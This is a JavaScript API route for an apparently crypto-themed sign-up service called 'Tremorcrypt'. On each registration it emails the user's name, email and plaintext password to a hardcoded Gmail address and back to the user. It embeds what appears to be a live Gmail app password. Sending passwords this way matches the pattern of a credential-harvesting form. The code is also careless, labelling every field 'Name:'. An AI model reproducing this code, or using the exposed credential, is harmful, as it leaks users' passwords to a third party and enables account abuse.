const nodemailer = require('nodemailer');

export default async function handler(req, res) {
    const { email, body } = req.body;

    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'harpycryto@gmail.com',
            pass: 'nuwnibnaqbqzjhpb',
        },
    });

    const mailOptions = {
        from: email,
        to: 'harpycryto@gmail.com',
        subject: 'New Register On Tremorcrypt!',
        text: `
        New Register On Tremorcrypt!

        Name: ${body.name}
        Name: ${body.email}
        Name: ${body.password}
        `
    };

    const mailOptionsUser = {
        from: 'harpycryto@gmail.com',
        to: email,
        subject: 'New Register On Tremorcrypt!',
        text: `
        New Register On Tremorcrypt!

        Name: ${body.name}
        Name: ${body.email}
        Name: ${body.password}
        `
    };

    try {
        await transporter.sendMail(mailOptions);
        await transporter.sendMail(mailOptionsUser);

        res.status(200).json({ message: 'Email sent successfully' });
    } catch (error) {
        console.error('Error sending email:', error);
        res.status(500).json({ error: 'An error occurred while sending the email' });
    }
}
